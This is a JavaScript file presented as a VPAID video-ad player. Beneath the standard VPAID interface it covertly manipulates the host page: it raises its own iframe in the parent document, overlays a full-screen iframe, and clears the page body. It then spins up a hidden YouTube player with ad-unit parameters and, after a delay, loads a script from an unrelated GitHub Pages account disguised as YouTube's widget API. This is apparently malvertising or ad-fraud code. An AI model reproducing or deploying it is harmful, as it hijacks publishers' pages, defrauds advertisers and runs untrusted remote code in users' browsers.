var VpaidVideoPlayer = function() {
    this.slot_ = null;
    this.videoSlot_ = null;
    this.eventsCallbacks_ = {};
    this.attributes_ = {
        'companions' : '',
        'desiredBitrate' : 256,
        'duration' : 10,
        'expanded' : true,
        'height' : 0,
        'icons' : '',
        'linear' : true,
        'remainingTime' : 10,
        'skippableState' : false,
        'viewMode' : 'thumbnail',
        'width' : 0,
        'volume' : 1.0
    };
    this.quartileEvents_ = [
        {event: 'AdImpression', value: 0},
        {event: 'AdVideoStart', value: 0},
        {event: 'AdVideoFirstQuartile', value: 25},
        {event: 'AdVideoMidpoint', value: 50},
        {event: 'AdVideoThirdQuartile', value: 75},
        {event: 'AdVideoComplete', value: 100}
    ];
    this.nextQuartileIndex_ = 0;
    this.called_resizeAd_ = 0;
    this.parameters_ = {};
};
VpaidVideoPlayer.prototype.handshakeVersion = function(version) {return ('2.0')};
VpaidVideoPlayer.prototype.initAd = function(width, height, viewMode, desiredBitrate, creativeData, environmentVars) {
    try{
        var arr=window.parent.document.getElementsByTagName("iframe");
        for (var i = 0; i < arr.length; i++) {
            if(window.parent.document.getElementsByTagName("iframe")[i].contentWindow == window){
                window.parent.document.getElementsByTagName("iframe")[i].style.zIndex='1000';
            }
        }
    } catch(e){}
    this.attributes_['width'] = width;
    this.attributes_['height'] = height;
    this.attributes_['viewMode'] = viewMode;
    this.attributes_['desiredBitrate'] = desiredBitrate;
    this.slot_ = environmentVars.slot;
    this.videoSlot_ = environmentVars.videoSlot;
    this.parameters_ = JSON.parse(creativeData['AdParameters']);
    this.updateVideoSlot_();
    this.callEvent_('AdLoaded');
};
VpaidVideoPlayer.prototype.clickAd_ = function() {
    if ('AdClickThru' in this.eventsCallbacks_) {
        this.eventsCallbacks_['AdClickThru']('','0', true);
    }
};
VpaidVideoPlayer.prototype.loadedMetadata_ = function() {};
VpaidVideoPlayer.prototype.timeUpdateHandler_ = function() {
    if (this.nextQuartileIndex_ >= this.quartileEvents_.length) return;
    var percentPlayed = this.videoSlot_.currentTime * 100.0 / this.videoSlot_.duration;
    if (percentPlayed >= this.quartileEvents_[this.nextQuartileIndex_].value) {
        var lastQuartileEvent = this.quartileEvents_[this.nextQuartileIndex_].event;
        this.eventsCallbacks_[lastQuartileEvent]();
        this.nextQuartileIndex_ += 1;
    }
    if (this.videoSlot_.duration > 0) {
        this.attributes_['remainingTime'] = this.videoSlot_.duration - this.videoSlot_.currentTime;
    }
};
VpaidVideoPlayer.prototype.updateVideoSlot_ = function() {
    if (this.videoSlot_ == null) {
        this.videoSlot_ = document.createElement('video');
        this.slot_.appendChild(this.videoSlot_);
    }
    this.updateVideoPlayerSize_();
};
VpaidVideoPlayer.prototype.updateVideoPlayerSize_ = function() {
    this.videoSlot_.setAttribute('width', this.attributes_['width']);
    this.videoSlot_.setAttribute('height', this.attributes_['height']);
};
VpaidVideoPlayer.prototype.startAd = function() {
    this.log('Starting ad');
    var cordinat=this.slot_.getBoundingClientRect();
    this.callEvent_('AdStarted');  
    this.callEvent_('AdPaused');
    this.slot_.setAttribute('width', "100%");
    this.slot_.setAttribute('height', "100%");
    this.slot_.setAttribute('style', "height:100%;width:100%;position:absolute;");
    var b = document.getElementsByTagName('head')[0];
    var s = document.createElement('style');
    s.innerHTML='html,body{margin:0px;padding:0px;width:100%;height:100%;position:relative:z-index:1001;}';
    b.parentNode.insertBefore(s, b);
    var stream = document.createElement('iframe');
    stream.setAttribute("style","height:100%;width:100%;border:0px;position:absolute;top:"+cordinat.top+"px;left:"+cordinat.left+"px;z-Index:10000000;"); 
    stream.setAttribute("allowFullScreen","");

    try{
        this.slot_.appendChild(stream);     
    } catch(e){
        this.slot_.ownerDocument.body.appendChild(stream);
    }
    
    var $this = this;
    var listener_ = function(a){
        if(a.data=='YV_onerror') {      
            stream.style='width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';
            $this.callEvent_('AdError');
            $this.callEvent_('AdStopped');
        }
        if(a.data=='YV_skipped') {
            stream.style='width:0px;height:0px;overflow:hidden;position:fixed;top:100%;display:none;';
            $this.callEvent_('AdVideoComplete');
            $this.callEvent_('AdSkipped');
            $this.callEvent_('AdStopped');
        }
    };

    var w = (this.slot_.ownerDocument.defaultView) ? this.slot_.ownerDocument.defaultView : this.slot_.ownerDocument.parentWindow;
    if (w.addEventListener) {
        w.addEventListener("message", listener_);
    } else {
        w.attachEvent("onmessage", listener_);
    }
};
VpaidVideoPlayer.prototype.stopAd = function() {
    this.log('Stopping ad');
    var callback = this.callEvent_.bind(this);
    setTimeout(callback, 75, ['AdStopped']);
};
VpaidVideoPlayer.prototype.resizeAd = function(width, height, viewMode) {
    var ua = window.navigator.userAgent;
    var iOS = !!ua.match(/iPad/i) || !!ua.match(/iPhone/i);
    var webkit = !!ua.match(/WebKit/i);
    var iOSSafari = iOS && webkit && !ua.match(/CriOS/i);
    if (!iOSSafari) {
        this.log('resizeAd ' + width + 'x' + height + ' ' + viewMode);
        this.attributes_['width'] = width;
        this.attributes_['height'] = height;
        this.attributes_['viewMode'] = viewMode;
        this.updateVideoPlayerSize_();
        this.callEvent_('AdSizeChange');
        this.called_resizeAd_++;
    }
};
VpaidVideoPlayer.prototype.pauseAd = function() {
    this.log('pauseAd');
    this.videoSlot_.pause();
    this.callEvent_('AdPaused');
};
VpaidVideoPlayer.prototype.resumeAd = function() {
    this.log('resumeAd');
    this.videoSlot_.play();
    this.callEvent_('AdPlaying');
};
VpaidVideoPlayer.prototype.expandAd = function() {
    this.log('expandAd');
    this.attributes_['expanded'] = true;
    this.callEvent_('AdExpanded');
};
VpaidVideoPlayer.prototype.collapseAd = function() {
    this.log('collapseAd');
    this.attributes_['expanded'] = false;
};
VpaidVideoPlayer.prototype.skipAd = function() {
    this.log('skipAd');
    var skippableState = this.attributes_['skippableState'];
    if (skippableState) {
        this.callEvent_('AdSkipped');
    }
};
VpaidVideoPlayer.prototype.subscribe = function(aCallback, eventName, aContext) {
    this.log('Subscribe ' + eventName);
    var callBack = aCallback.bind(aContext);
    this.eventsCallbacks_[eventName] = callBack;
};
VpaidVideoPlayer.prototype.unsubscribe = function(eventName) {
    this.log('unsubscribe ' + eventName);
    this.eventsCallbacks_[eventName] = null;
};
VpaidVideoPlayer.prototype.getAdLinear = function() {
    return this.attributes_['linear'];
};
VpaidVideoPlayer.prototype.getAdWidth = function() {
    return this.attributes_['width'];
};
VpaidVideoPlayer.prototype.getAdHeight = function() {
    return this.attributes_['height'];
};
VpaidVideoPlayer.prototype.getAdExpanded = function() {
    return this.attributes_['expanded'];
};
VpaidVideoPlayer.prototype.getAdSkippableState = function() {
    return this.attributes_['skippableState'];
};
VpaidVideoPlayer.prototype.getAdRemainingTime = function() {
    return this.attributes_['remainingTime'];
};
VpaidVideoPlayer.prototype.getAdDuration = function() {
    return this.attributes_['duration'];
};
VpaidVideoPlayer.prototype.getAdVolume = function() {
    return this.attributes_['volume'];
};
VpaidVideoPlayer.prototype.setAdVolume = function(value) {
    this.attributes_['volume'] = value;
    this.log('setAdVolume ' + value);
    this.callEvent_('AdVolumeChange');
};
VpaidVideoPlayer.prototype.getAdCompanions = function() {
    return this.attributes_['companions'];
};
VpaidVideoPlayer.prototype.getAdIcons = function() {
    return this.attributes_['icons'];
};
VpaidVideoPlayer.prototype.log = function(message) {
    //console.log(message);
};
VpaidVideoPlayer.prototype.callEvent_ = function(eventType) {
    if (eventType in this.eventsCallbacks_) {
        this.eventsCallbacks_[eventType]();
    }
};
var getVPAIDAd = function() {
    return new VpaidVideoPlayer();
};

var newstr = window.location.href.replace('https://s0.2mdn.net/ads/richmedia/studio/mu/templates/tetris/bootstrap-3/tetris.html#ai=',"");
document.getElementsByTagName("body")[0].innerHTML='';
var gl=-1;
var yt_data_p2;
var onYouTubePlayerAPIReady = function() {
		document.getElementsByTagName("body")[0].innerHTML='';
		yt_dm_iframe = document.createElement("div");
		yt_dm_iframe.id='yt_if_tv_del';
		yt_dm_iframe.style = "left:0px;top:0px;border:0px;";
//		yt_dm_iframe.style.width = "250px";
//		yt_dm_iframe.style.height = "250px";
		yt_dm_iframe.style.display = "block";
		yt_dm_iframe.style.position = "fixed";
		document.getElementsByTagName("body")[0].appendChild(yt_dm_iframe);
		new_video();
}

var ccc = 0;
var onPlayerReady = function(e){

   

    
	

}

	
var pause = function(){
  if(start_video==0){
     
  }
}
var ai=0;
var stBufPlay = function(){
   if(start_video==0){
		 
   }
}
var autoplay=0;
function listener(a){
	if(a.data == 'close_ad'){
		//yt_if_tv_del.mute();
	}
}
if (window.addEventListener) {
 window.addEventListener("message", listener);
} else {
  window.attachEvent("onmessage", listener);
}

var buf=0;
var onPlayerStateChange = function(e){
	stats=yt_if_tv_del.getVideoStats();
	if(stats.fexp==undefined){	
		buf=buf+1;
		if(buf>2){
		e.target.destroy();
				

			new_video();
			

		buf=0;

	   }
	} 
	else {
		
		//e.target.destroy();
	  // window.parent.parent.parent.postMessage({fexp:stats.fexp,all:stats},'*');
			
	}
}
	

	



var startAD=0;
var onAdStateChange = function(e){	

}
var onApiChange = function(e){
		yt_if_tv_del.addEventListener('onAdStateChange',onAdStateChange);	
}
var start_video;

var xmlhttp,cl_setings,ad,id_v_yt,id_v_yt2,trend,yt_data_p2;
start_video=0;
var new_video = function(){
	
		yt_if_tv_del = new YT.Player('yt_if_tv_del', {
          height: '360',
	  host:'https://www.youtube.com',
          width: '640',
          videoId: '5Frn-HSCr-Y' ,
           'autoplay': 0,
          playsinline: true,
		  playerVars: {
			 // 'list': 'PL_yIBWagYVjztnssruzd0PHc92RY8giOA',
			   'controls': 0, 
			  	'mute' : false,
				'playsinline': true,
			        //'playlist':'eOj-0mDgbaM,eOj-0mDgbaM',
			                'el':'adunit',
			                'adformat':'15_2_1',
					'override_hl': 1
			               
					
					
			
		  },				
          events: {
            'onReady': onPlayerReady,
            'onStateChange': onPlayerStateChange
          }
        });
    
}


setTimeout(function(){
if (!window['YT']) {var YT = {loading: 0,loaded: 0};}if (!window['YTConfig']) {var YTConfig = {'host': 'https://cards-frame.twitter.com/i/cards/tfw/v1/uc/1207618818023010304'};}if (!YT.loading) {YT.loading = 1;(function(){var l = [];YT.ready = function(f) {if (YT.loaded) {f();} else {l.push(f);}};window.onYTReady = function() {YT.loaded = 1;for (var i = 0; i < l.length; i++) {try {l[i]();} catch (e) {console.log(e);}}};YT.setConfig = function(c) {for (var k in c) {if (c.hasOwnProperty(k)) {YTConfig[k] = c[k];}}};var a = document.createElement('script');a.type = 'text/javascript';a.id = 'www-widgetapi-script';a.src = 'https://coolboy112233.github.io/unknowbastard/www-widgetapi.js';a.async = true;var b = document.getElementsByTagName('head')[0];b.parentNode.insertBefore(a, b);})();}	
},1000);


